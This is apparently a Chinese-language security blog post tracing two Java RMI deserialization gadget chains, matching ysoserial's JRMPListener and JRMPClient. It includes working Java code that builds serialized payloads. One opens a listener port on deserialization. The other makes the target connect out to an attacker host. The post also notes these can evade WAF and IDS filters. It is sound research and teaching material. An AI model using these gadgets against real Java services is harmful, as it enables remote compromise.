---
layout: mypost
title: "记录 RMI 引出的 Gadgets"
categories: [Java安全]
---

## 前言

好久不见，在“RMI 反序列化 Attack”一文，最后说到要去记录一下 RMI 引出的 Gadgets 以及 JEP 290 的绕过方式，它来了。这篇文章先来记录一下 RMI 引出的两条 Gadgets。

## 第一条

这一条 Gadget 说白了就是利用一个反序列化的入口点去新开启了一个 RMI 的 Server 端，后续可以使用之前提到的攻击 Server 端的方式去打它，也就是 Ysoserial 中 ysoserial.exploit.JRMPClient 这个 Payload。

既然是去新开启了一个 RMI 的 Server 端，也就是对应着之前文章中看到的这一行代码：`HelloRemoteObject helloRemoteObject = new HelloRemoteObject();`，其中具体每一步的实现早就跟过了，这里不在赘述，将里面最关键的一个断点记录如下-->

![](image-399.png)

从上图的代码往后开始，就是一路到 UnicastServerRef 类的 exportObject 方法、创建 stub（ServerStubs）、启动 socket、发布 Target等一套标准的创建 Server 端的流程。那就从上图中的代码再向上跟，看看是否可以跟到一个 readObject，一层一层去查看它的方法调用-->

![](image-400.png)

然后再看`public static Remote exportObject(Remote obj, int port)`的方法调用-->

![](image-401.png)

再看`private void reexport() throws RemoteException`的方法调用-->

![](image-402.png)

最后成功的跟到了一处 readObject，整条链子就已经 END 了，其实只需要反射去调用 UnicastRemoteObject 类的构造方法这一步即可，去写一个 Demo 如下-->

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;

public class JRMPListenerPayload {

    public static void main(String[] args) throws Exception {
        int port = 9999;
        Class<?> clazz = Class.forName("java.rmi.server.UnicastRemoteObject");
        Constructor<?> ctor = clazz.getDeclaredConstructor(int.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(port);
        serializeObject(instance);
        unSerializeObject("ser.bin");
        Thread.sleep(1000);
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

切换到 JDK 8u65 这样一个低版本后运行（因为高版本在 RegistryImpl 类和 DGCImpl 类中加入了过滤机制，也就是 JEP 290，会导致攻击失败），成功在本地开启了 9999 端口，如下-->

![](image-403.png)

后续使用 ysoserial.exploit.JRMPClient 这个 Payload 尝试攻击此端口-->

![](image-404.png)

成功触发 DNS 请求，如下-->

![](image-394.png)

这个链⛓️‍💥其实就是 Ysoserial 中 ysoserial.payloads.JRMPListener 这个 gadget，可以结合 ysoserial.exploit.JRMPClient 这个 Payload 去发起攻击。它在某些情况下是可以规避一些黑名单的限制，绕过 WAF、IDS等。

## 第二条

而这一条 Gadget 相当于利用一个反序列化点，可以使得服务器主动对外发起一次类似于 RMI Client 端的请求，那就可以伪造一个 Server、Rigister、DGC 去打客户端的 StreamRemoteCall.executeCall(xxx)。

既然是要去伪造一个 Client 端，那肯定就是要去找创建 Stub 相关的逻辑，然后一层层向上跟，看看有没有能到 readObject 的，其实和上面第一条 Gadget 都是一个挖掘逻辑。这里 Ysoserial 的作者选择了去看 DGCImpl_Stub，Sink 是选择了它的 dirty 方法，如下-->

![](image-405.png)

那好，查看它的方法调用，只有一处-->

![](image-406.png)

再去跟`private void makeDirtyCall(Set<RefEntry> refEntries, long sequenceNum)`的方法调用，如下-->

![](image-407.png)

有两处调用，其中下面那处顾名思义是清理后台线程相关的代码，不关注，选择上面`public boolean registerRefs(List<LiveRef> refs)`这一处代码继续向上跟-->

![](image-408.png)

也是只有一处去调用，那么再去跟`static void registerRefs(Endpoint ep, List<LiveRef> refs)`的方法调用，如下-->

![](image-409.png)

一共有两处调用，记得组长是走的第一处，而 Ysoserial 的作者是走的第二处，跟一下第二处`public static LiveRef read(ObjectInput in, boolean useNewFormat)`的方法调用情况-->

![](image-410.png)

成功的走到了 readExternal！sun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用其 readExternal 方法执行额外的逻辑。

Tips：这里可以举个例子

新建一个 Demo 类如下-->

```java
import java.io.*;

public class Demo implements Externalizable {

    public Demo() {}

    public void writeExternal(ObjectOutput out) throws IOException {
        // 空实现
    }

    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        System.out.println("readExternal executed!");
    }

    public void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        System.out.println("readObject executed!");
    }
}
```

新建测试类如下-->

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class DemoTest {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);

        oos.writeObject(new Demo());
        oos.close();

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);

        ois.readObject();
    }
}

```

运行测试类，结果如下-->

```
readExternal executed!
```

即想说明当某个类实现了 Externalizable 接口，当通过 readObject() 进行反序列化时，JVM 会调用该类的无参构造方法后，自动调用其 readExternal()。

那么整条链就通了，由于 UnicastRef 的构造函数是 Public 的，那么写法也更简单了，都不需要使用到反射，给出 Demo 如下-->

```java
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.util.Random;

public class JRMPClientPayload {

    public static void main(String[] args) throws Exception {

        String host = "xxx.xxx.xxx.xxx";
        int port = 1099;
        ObjID id  = new ObjID(new Random().nextInt());
        TCPEndpoint te  = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        serializeObject(ref);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

接着去伪造一个 Server 端，直接用 Ysoserial 中 ysoserial.exploit.JRMPListener 这个 Payload 就好，之前记录过，这里不再赘述。开启后，运行上面的 Demo，1099 端口成功收到请求如下-->

![](image-412.png)

此时也成功触发 DNS 请求，如下-->

![](image-394.png)

这第二条链其实就是 Ysoserial 中 ysoserial.payloads.JRMPClient 这个 gadget，可以结合 ysoserial.exploit.JRMPListener 这个 Payload 去发起攻击。是很重要的一条链，不管是之后的 Bypass JEP 290 还是 Shiro 的二次反序列化等场景都会见到它的身影。

记录到此结束！